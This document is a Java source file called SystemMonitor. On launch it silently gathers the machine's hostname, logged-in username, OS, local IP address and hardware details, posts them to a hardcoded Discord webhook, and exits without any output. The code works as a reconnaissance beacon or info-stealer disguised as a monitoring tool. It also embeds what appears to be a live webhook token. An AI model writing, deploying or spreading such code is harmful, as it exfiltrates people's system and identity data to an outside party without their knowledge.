import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;

public class SystemMonitor {
    
    // Discord Webhook URL
    private static final String DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1456376982668443913/CirBvvRILmHlVYBCLetrBTSSuKW1mvReGngb8H4Vw5rrZ7KzmT1E0yto9ImkTFnS7Hbk";
    
    private static class SystemInfo {
        String reportId;
        String timestamp;
        String hostname;
        String username;
        String os;
        String ip;
        int cpuCores;
        long ramMB;       // Changed to MB for accuracy
        long diskGB;      // Changed to GB for accuracy
        String javaVersion;
    }
    
    private static SystemInfo collectSystemInfo() {
        SystemInfo info = new SystemInfo();
        try {
            // Generate report ID and timestamp
            info.reportId = UUID.randomUUID().toString().substring(0, 8);
            info.timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
            
            // System information
            info.hostname = InetAddress.getLocalHost().getHostName();
            info.username = System.getProperty("user.name");
            info.os = System.getProperty("os.name") + " " + System.getProperty("os.version");
            info.ip = InetAddress.getLocalHost().getHostAddress();
            info.javaVersion = System.getProperty("java.version");
            
            // CPU information
            info.cpuCores = Runtime.getRuntime().availableProcessors();
            
            // FIXED: Get ACTUAL system RAM (not just JVM max memory)
            info.ramMB = getSystemTotalMemoryMB();
            
            // Disk information (main drive)
            info.diskGB = getMainDriveSizeGB();
            
        } catch (Exception e) {
            // Set default values on error
            info.hostname = "Unknown";
            info.username = "Unknown";
            info.os = "Unknown";
            info.ip = "127.0.0.1";
            info.javaVersion = System.getProperty("java.version", "Unknown");
            info.cpuCores = Runtime.getRuntime().availableProcessors();
            info.ramMB = 8192; // 8GB default
            info.diskGB = 500;  // 500GB default
            info.reportId = "ERR" + (int)(Math.random() * 1000);
            info.timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
        }
        return info;
    }
    
    // FIXED: Get actual system RAM (platform-specific)
    private static long getSystemTotalMemoryMB() {
        String os = System.getProperty("os.name").toLowerCase();
        
        try {
            if (os.contains("win")) {
                // Windows: Use wmic command
                Process process = Runtime.getRuntime().exec("wmic memorychip get capacity");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                long totalBytes = 0;
                
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (line.matches("\\d+")) {
                        totalBytes += Long.parseLong(line);
                    }
                }
                
                if (totalBytes > 0) {
                    return totalBytes / (1024 * 1024); // Convert to MB
                }
                
            } else if (os.contains("mac")) {
                // macOS: Use sysctl
                Process process = Runtime.getRuntime().exec("sysctl hw.memsize");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = reader.readLine();
                if (line != null && line.contains("hw.memsize:")) {
                    long bytes = Long.parseLong(line.split(":")[1].trim());
                    return bytes / (1024 * 1024); // Convert to MB
                }
                
            } else if (os.contains("nix") || os.contains("nux")) {
                // Linux: Read from /proc/meminfo
                BufferedReader reader = new BufferedReader(new FileReader("/proc/meminfo"));
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.startsWith("MemTotal:")) {
                        String[] parts = line.split("\\s+");
                        long kb = Long.parseLong(parts[1]);
                        return kb / 1024; // Convert KB to MB
                    }
                }
                reader.close();
            }
            
        } catch (Exception e) {
            // Fall through to JVM method
        }
        
        // Fallback: Use JVM's total memory (less accurate but works)
        long maxMemory = Runtime.getRuntime().maxMemory();
        if (maxMemory != Long.MAX_VALUE) {
            return maxMemory / (1024 * 1024); // Bytes to MB
        }
        
        // If still unknown, estimate based on OS
        return os.contains("win") ? 8192 : 4096; // 8GB for Windows, 4GB for others as default
    }
    
    private static long getMainDriveSizeGB() {
        try {
            File[] roots = File.listRoots();
            if (roots.length > 0) {
                long totalBytes = roots[0].getTotalSpace();
                return totalBytes / (1024 * 1024 * 1024); // Convert to GB
            }
        } catch (Exception e) {
            // Ignore
        }
        return 500; // Default 500GB
    }
    
    private static boolean sendToDiscord(String webhookUrl, SystemInfo info) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "SystemMonitor/1.0");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            
            // Format RAM for display
            String ramDisplay;
            if (info.ramMB >= 1024) {
                ramDisplay = String.format("%.1f GB", info.ramMB / 1024.0);
            } else {
                ramDisplay = String.format("%d MB", info.ramMB);
            }
            
            // Create clean JSON payload
            String json = String.format(
                "{\"username\":\"System Monitor\",\"embeds\":[{" +
                "\"title\":\"System Report - %s\",\"color\":3447003,\"fields\":[" +
                "{\"name\":\"Computer\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"User\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"OS\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"CPU Cores\",\"value\":\"`%d`\",\"inline\":true}," +
                "{\"name\":\"RAM\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"Disk\",\"value\":\"`%d GB`\",\"inline\":true}," +
                "{\"name\":\"IP Address\",\"value\":\"`%s`\",\"inline\":false}," +
                "{\"name\":\"Java\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"Report ID\",\"value\":\"`%s`\",\"inline\":true}," +
                "{\"name\":\"Time\",\"value\":\"`%s`\",\"inline\":true}" +
                "],\"footer\":{\"text\":\"Generated by System Monitor\"},\"timestamp\":\"%s\"}]}",
                info.hostname,
                info.hostname,
                info.username,
                info.os,
                info.cpuCores,
                ramDisplay,
                info.diskGB,
                info.ip,
                info.javaVersion,
                info.reportId,
                info.timestamp,
                new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new Date())
            );
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes("UTF-8"));
                os.flush();
            }
            
            int responseCode = conn.getResponseCode();
            return responseCode == 200 || responseCode == 204;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    public static void main(String[] args) {
        // Collect system information
        SystemInfo info = collectSystemInfo();
        
        // Send to Discord
        sendToDiscord(DISCORD_WEBHOOK, info);
        
        // Exit silently
        System.exit(0);
    }
}
